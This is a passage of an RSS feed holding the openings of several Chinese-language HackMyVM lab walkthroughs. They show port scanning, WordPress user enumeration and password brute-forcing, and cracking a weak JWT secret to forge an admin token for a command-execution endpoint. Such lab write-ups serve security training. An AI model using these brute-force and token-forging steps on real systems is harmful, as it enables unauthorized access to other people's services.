+我比较喜欢先看ftp21端口。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_CodeShield.html</guid><pubDate>Thu, 20 Mar 2025 08:00:30 +0000</pubDate></item><item><title>hmv_Chromatica</title><link>https://7r1UMPH.github.io/post/hmv_Chromatica.html</link><description># hmv_Chromatica
+
+**靶机**：https://hackmyvm.eu/machines/machine.php?vm\=Chromatica
+**难度**：绿色
+**目标 IP**：192.168.205.215
+**本机** IP：192.168.205.141
+
+---
+
+### **1. 端口枚举及服务探测**
+
+首先，使用 `nmap` 扫描目标 IP 的开放端口：
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.215
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 14:18 CST
+Nmap scan report for 192.168.205.215
+Host is up (0.0017s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
+5353/tcp open  domain  dnsmasq 2.86
+MAC Address: 08:00:27:95:39:FD (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.66 seconds
+```
+
+扫描结果显示目标机器开放了 22 (SSH) 、 80 (HTTP) 、5353(DNS)端口。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Chromatica.html</guid><pubDate>Thu, 20 Mar 2025 07:59:27 +0000</pubDate></item><item><title>hmv_canto</title><link>https://7r1UMPH.github.io/post/hmv_canto.html</link><description># hmv_canto
+
+**靶机**：https://hackmyvm.eu/machines/machine.php?vm=canto
+**难度**：绿色
+**目标 IP**：192.168.205.213
+**本机** IP：192.168.205.141
+
+---
+
+### **1. 端口枚举及服务探测**
+
+首先，使用 `nmap` 扫描目标 IP 的开放端口：
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.213
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 19:05 CST
+Nmap scan report for 192.168.205.213
+Host is up (0.00026s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))
+MAC Address: 08:00:27:80:A9:92 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.13 seconds
+
+```
+
+扫描结果显示目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_canto.html</guid><pubDate>Thu, 20 Mar 2025 07:58:25 +0000</pubDate></item><item><title>hmv_buster</title><link>https://7r1UMPH.github.io/post/hmv_buster.html</link><description># hmv_buster
+
+# 0.简介
+
+**靶机**：[hackmyvm - buster](https://hackmyvm.eu/machines/machine.php?vm=buster)
+**难度**：绿色
+**目标 IP**：192.168.205.142
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.142
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 20:11 CST
+Nmap scan report for 192.168.205.142
+Host is up (0.00022s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:09:D8:74 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds
+
+```
+
+先看**80端口**，**22端口**候补
+
+# 2.踩点
+
+![image](https://github.com/user-attachments/assets/9eb492e1-d1d8-4170-bb5f-990d1792265b)
+是个**wordPress，**  拿**wpscan**扫描一下
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ wpscan --url http://192.168.205.142/ -e vp,u --api-token xxx   #api-token注册wpscan官网获取
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.27
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://192.168.205.142/ [192.168.205.142]
+[+] Started: Wed Jan 15 20:13:50 2025
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: nginx/1.14.2
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://192.168.205.142/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://192.168.205.142/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://192.168.205.142/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://192.168.205.142/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
+ | Found By: Meta Generator (Passive Detection)
+ |  - http://192.168.205.142/, Match: 'WordPress 6.7.1'
+ | Confirmed By: Rss Generator (Aggressive Detection)
+ |  - http://192.168.205.142/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;
+ |  - http://192.168.205.142/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;
+
+[i] The main theme could not be detected.
+
+[+] Enumerating Vulnerable Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 &lt;========================================================&gt; (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] ta0
+ | Found By: Wp Json Api (Aggressive Detection)
+ |  - http://192.168.205.142/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ | Confirmed By:
+ |  Rss Generator (Aggressive Detection)
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] welcome
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] WPScan DB API OK
+ | Plan: free
+ | Requests Done (during the scan): 1
+ | Requests Remaining: 18
+
+[+] Finished: Wed Jan 15 20:13:57 2025
+[+] Requests Done: 53
+[+] Cached Requests: 6
+[+] Data Sent: 13.267 KB
+[+] Data Received: 413.04 KB
+[+] Memory used: 229.277 MB
+[+] Elapsed time: 00:00:07
+                                                     
+```
+
+主要的信息有`WordPress 6.7.1`和两个用户名`ta0`、`welcome`，但是`WordPress 6.7.1`没有漏洞，只可以爆破密码了
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ wpscan -U ta0,welcome -P /usr/share/wordlists/q5000.txt --url http://192.168.205.142/             
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.27
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+（省略）
+
+[+] Performing password attack on Xmlrpc against 2 user/s
+Trying ta0 / speaker Time: 00:01:37 &lt;=========================================================&gt; (10000 / 10000) 100.00% Time: 00:01:37
+
+[i] No Valid Passwords Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Wed Jan 15 20:18:29 2025
+[+] Requests Done: 10142
+[+] Cached Requests: 34
+[+] Data Sent: 5.147 MB
+[+] Data Received: 5.559 MB
+[+] Memory used: 278.031 MB
+[+] Elapsed time: 00:01:40
+
+```
+
+爆破了前5000行`rockyou.txt`都没有结果，没有必要爆破了，根据现在获得的信息无法判断出攻击面，但是`WordPress`靶机还有一个攻击点——**插件**
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ wpscan --url http://192.168.205.142/ -e ap --plugins-detection aggressive --api-token xxx   #api-token注册wpscan官网获取
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.27
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+（省略）
+
+[+] Enumerating All Plugins (via Aggressive Methods)
+ Checking Known Locations - Time: 00:17:12 &lt;================================================&gt; (108550 / 108550) 100.00% Time: 00:17:12
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] akismet
+ | Location: http://192.168.205.142/wp-content/plugins/akismet/
+ | Latest Version: 5.3.5 (up to date)
+ | Last Updated: 2024-11-19T02:02:00.000Z
+ | Readme: http://192.168.205.142/wp-content/plugins/akismet/readme.txt
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://192.168.205.142/wp-content/plugins/akismet/, status: 200
+ |
+ | Version: 5.3.5 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://192.168.205.142/wp-content/plugins/akismet/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://192.168.205.142/wp-content/plugins/akismet/readme.txt
+
+[+] feed
+ | Location: http://192.168.205.142/wp-content/plugins/feed/
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://192.168.205.142/wp-content/plugins/feed/, status: 200
+ |
+ | The version could not be determined.
+
+[+] wp-query-console
+ | Location: http://192.168.205.142/wp-content/plugins/wp-query-console/
+ | Latest Version: 1.0 (up to date)
+ | Last Updated: 2018-03-16T16:03:00.000Z
+ | Readme: http://192.168.205.142/wp-content/plugins/wp-query-console/README.txt
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://192.168.205.142/wp-content/plugins/wp-query-console/, status: 403
+ |
+ | [!] 1 vulnerability identified:
+ |
+ | [!] Title: WP Query Console &lt;= 1.0 - Unauthenticated Remote Code Execution
+ |     References:
+ |      - https://wpscan.com/vulnerability/f911568d-5f79-49b7-8ce4-fa0da3183214
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50498
+ |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ae07ca12-e827-43f9-8cbb-275b9abbd4c3
+ |
+ | Version: 1.0 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://192.168.205.142/wp-content/plugins/wp-query-console/README.txt
+
+[+] WPScan DB API OK
+ | Plan: free
+ | Requests Done (during the scan): 3
+ | Requests Remaining: 15
+
+[+] Finished: Wed Jan 15 20:39:16 2025
+[+] Requests Done: 108575
+[+] Cached Requests: 44
+[+] Data Sent: 29.36 MB
+[+] Data Received: 32.766 MB
+[+] Memory used: 479.719 MB
+[+] Elapsed time: 00:17:25
+
+```
+
+`wp-query-console`有漏洞，我们去搜索一下有没有利用方案。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_buster.html</guid><pubDate>Thu, 20 Mar 2025 07:57:23 +0000</pubDate></item><item><title>hmv_Blackhat2</title><link>https://7r1UMPH.github.io/post/hmv_Blackhat2.html</link><description># hmv_Blackhat2
+
+**靶机**：[HackMyVM - Blackhat2](https://hackmyvm.eu/machines/machine.php?vm=Blackhat2)
+**难度**：黄色
+**目标 IP**：192.168.205.218
+**本机 IP**：192.168.205.141
+
+## 1. 端口枚举及服务探测
+
+首先，使用 `nmap` 扫描目标 IP 的开放端口：
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.218
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 21:27 CST
+Nmap scan report for 192.168.205.218
+Host is up (0.00034s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.57 ((Debian))
+MAC Address: 08:00:27:17:26:A8 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+从 `nmap` 扫描结果来看，目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Blackhat2.html</guid><pubDate>Thu, 20 Mar 2025 07:56:22 +0000</pubDate></item><item><title>hmv_azer</title><link>https://7r1UMPH.github.io/post/hmv_azer.html</link><description># hmv_azer
+
+# 0.简介
+
+**靶机**：[hackmyvm - azer](https://hackmyvm.eu/machines/machine.php?vm=Azer)
+**难度**：绿色
+**目标 IP**：192.168.205.235
+**本机 IP**：192.168.205.141
+
+---
+
+# 1.扫描
+
+使用 `Nmap` 进行初步端口扫描，以识别开放的服务和端口：
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS -p- -Pn -n -T4 192.168.205.235
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 11:19 CST
+Nmap scan report for 192.168.205.235
+Host is up (0.00038s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+80/tcp   open  http
+3000/tcp open  ppp
+MAC Address: 08:00:27:07:E9:02 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
+                                                           
+```
+
+结果显示两个开放端口：
+
+**80/tcp** - HTTP 服务
+**3000/tcp** - 原始显示为 PPP，但实际上是一个 web 应用程序，用于用户认证
+
+---
+
+# 2.踩点
+
+`80`端口页没有发现明显利用点，踩点`3000`端口
+
+![image](https://github.com/user-attachments/assets/3b565e9c-e8cd-41ae-bf84-0cf6e7460d2e)
+
+![image](https://github.com/user-attachments/assets/f2dcad05-b377-43e6-aa7b-159b04935536)
+
+![image](https://github.com/user-attachments/assets/9ab7e04b-b4c3-4d36-9fdf-b4d1c827bf98)
+
+在进一步探索中发现，**3000** 端口的应用程序似乎通过执行 `.sh` 脚本来进行密码验证。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_azer.html</guid><pubDate>Thu, 20 Mar 2025 07:55:21 +0000</pubDate></item><item><title>hmv_aurora</title><link>https://7r1UMPH.github.io/post/hmv_aurora.html</link><description># hmv_aurora
+
+# 0.简介
+
+**靶机**：[hackmyvm - aurora](https://hackmyvm.eu/machines/machine.php?vm=aurora)
+**难度**：绿色
+**目标 IP**：192.168.205.138
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 10:12 CST
+Nmap scan report for 192.168.205.138
+Host is up (0.00044s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+3000/tcp open  ppp
+MAC Address: 08:00:27:68:BD:31 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds
+```
+
+**3000**大概率是**web**页面
+
+# 2.踩点
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/
+&lt;!DOCTYPE html&gt;
+&lt;html lang='en'&gt;
+&lt;head&gt;
+&lt;meta charset='utf-8'&gt;
+&lt;title&gt;Error&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;pre&gt;Cannot GET /&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/
+&lt;!DOCTYPE html&gt;
+&lt;html lang='en'&gt;
+&lt;head&gt;
+&lt;meta charset='utf-8'&gt;
+&lt;title&gt;Error&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;pre&gt;Cannot GET /&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+```
+
+禁止`GET`访问，那我们就`POST`
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ feroxbuster -u 'http://192.168.205.138:3000' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -m POST
+                                                                                                                                    
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben 'epi' Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://192.168.205.138:3000
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, html, txt, md]
+ 🏁  HTTP methods          │ [POST]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404     POST       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
+401     POST        1l        2w       22c http://192.168.205.138:3000/login
+400     POST        1l        6w       29c http://192.168.205.138:3000/register
+401     POST        1l        2w       22c http://192.168.205.138:3000/Login
+400     POST        1l        6w       29c http://192.168.205.138:3000/Register
+401     POST        1l        1w       12c http://192.168.205.138:3000/execute
+
+```
+
+使用`curl`访问
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/login -X POST
+Identifiants invalides                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/register -X POST
+The 'role' field is not valid                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/execute -X POST 
+Unauthorized                                                                                                                                    
+
+```
+
+我们注册一个用户试试
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'admin\'}'
+Not authorized !
+```
+
+啊这，丢去`WFUZZ`爆破一下
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ wfuzz -c -u 'http://192.168.205.138:3000/register' -X POST -H 'Content-Type: application/json' -d '{\'role\':\'FUZZ\'}' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 --hw 6
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.205.138:3000/register
+Total requests: 62284
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                             
+=====================================================================
+
+000000003:   401        0 L      3 W        16 Ch       'admin'                                                             
+000000022:   500        0 L      5 W        32 Ch       'user'                                                              
+
+Total time: 58.91045
+Processed Requests: 62284
+Filtered Requests: 62282
+Requests/sec.: 1057.265
+
+```
+
+继续注册
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\'}' 
+Column 'username' cannot be null                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\',\'username\':\'xxoo\'}'
+Column 'password' cannot be null                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/register -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\',\'username\':\'xxoo\',\'password\':\'xxoo\'}'
+Registration OK                                                                                                                                     
+```
+
+去登录试试
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/login -X POST -H 'Content-Type: application/json' -d '{\'role\':\'user\',\'username\':\'xxoo\',\'password\':\'xxoo\'}'
+{'accessToken':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4b28iLCJyb2xlIjoidXNlciIsImlhdCI6MTczNzU5OTM0OH0.Q8Q3R6Bu_xXUKSTcrGR01y5-hB4ndX7vL1ck1H7XomA'}
+```
+
+这很`jwt`，去尝试解码，[网站](https://jwt.io/)
+
+![Image](https://github.com/user-attachments/assets/c55c1345-380f-4116-911b-b55fe1655ab6)
+
+将密钥爆破一下
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4b28iLCJyb2xlIjoidXNlciIsImlhdCI6MTczNzU5OTM0OH0.Q8Q3R6Bu_xXUKSTcrGR01y5-hB4ndX7vL1ck1H7XomA' &gt; hash
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 512/512 AVX512BW 16x])
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+nopassword       (?)   
+1g 0:00:00:00 DONE (2025-01-23 10:31) 100.0g/s 4915Kp/s 4915Kc/s 4915KC/s 123456..trudy
+Use the '--show' option to display all of the cracked passwords reliably
+Session completed.
+```
+
+改一下参数
+
+![Image](https://github.com/user-attachments/assets/8c4fe2dd-1e58-4776-b407-e717b8dd3ef6)
+
+尝试一下那个`execute`
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.138:3000/execute -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk'
+&lt;!DOCTYPE html&gt;
+&lt;html lang='en'&gt;
+&lt;head&gt;
+&lt;meta charset='utf-8'&gt;
+&lt;title&gt;Error&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;pre&gt;TypeError [ERR_INVALID_ARG_TYPE]: The &amp;quot;file&amp;quot; argument must be of type string. Received undefined&lt;br&gt; &amp;nbsp; &amp;nbsp;at validateString (internal/validators.js:120:11)&lt;br&gt; &amp;nbsp; &amp;nbsp;at normalizeSpawnArguments (child_process.js:411:3)&lt;br&gt; &amp;nbsp; &amp;nbsp;at spawn (child_process.js:547:16)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Object.execFile (child_process.js:237:17)&lt;br&gt; &amp;nbsp; &amp;nbsp;at exec (child_process.js:158:25)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/login-app/app.js:69:3&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/opt/login-app/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at next (/opt/login-app/node_modules/express/lib/router/route.js:144:13)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/login-app/app.js:112:5&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/login-app/node_modules/jsonwebtoken/verify.js:261:12&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+```
+
+`Authorization` 头以 `Bearer` 开头。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_aurora.html</guid><pubDate>Thu, 20 Mar 2025 07:54:19 +0000</pubDate></item><item><title>hmv_Apaches</title><link>https://7r1UMPH.github.io/post/hmv_Apaches.html</link><description># hmv_Apaches
+
+# 0. 简介
+
+**靶机**：[hackmyvm - Apaches](https://hackmyvm.eu/machines/machine.php?vm=Apaches)
+**难度**：绿色
+**目标 IP**：192.168.205.143
+**本机 IP**：192.168.205.141
+
+# 1. 扫描
+
+首先，通过 `nmap` 对靶机进行全端口扫描，检查开放端口和服务：
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 13:58 CST
+Nmap scan report for 192.168.205.143
+Host is up (0.00024s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:B2:79:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+```
+
+从扫描结果可以看到，靶机开启了 **SSH** 和 **HTTP** 服务。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Apaches.html</guid><pubDate>Thu, 20 Mar 2025 07:52:16 +0000</pubDate></item><item><title>hmv_airbind</title><link>https://7r1UMPH.github.io/post/hmv_airbind.html</link><description># hmv_airbind
+
+**靶机**：https://hackmyvm.eu/machines/machine.php?vm=airbind
+**难度**：黄色
+**目标 IP**：192.168.205.212
+**本机** IP：192.168.205.141
+
+---
+
+### **1. 端口枚举及服务探测**
+
+首先，使用 `nmap` 扫描目标 IP 的开放端口：
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.212
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 17:39 CST
+Nmap scan report for 192.168.205.212
+Host is up (0.00029s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE    SERVICE VERSION
+22/tcp filtered ssh
+80/tcp open     http    Apache httpd 2.4.57 ((Ubuntu))
+MAC Address: 08:00:27:AD:E1:D7 (Oracle VirtualBox virtual NIC)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=12/29%OT=80%CT=1%CU=32430%PV=Y%DS=1%DC=D%G=Y%M=0800
+OS:27%TM=677118F6%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%
+OS:II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11N
+OS:W7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE8
+OS:8%W6=FE88)ECN(R=Y%DF=Y%T=3F%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F
+OS:%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=
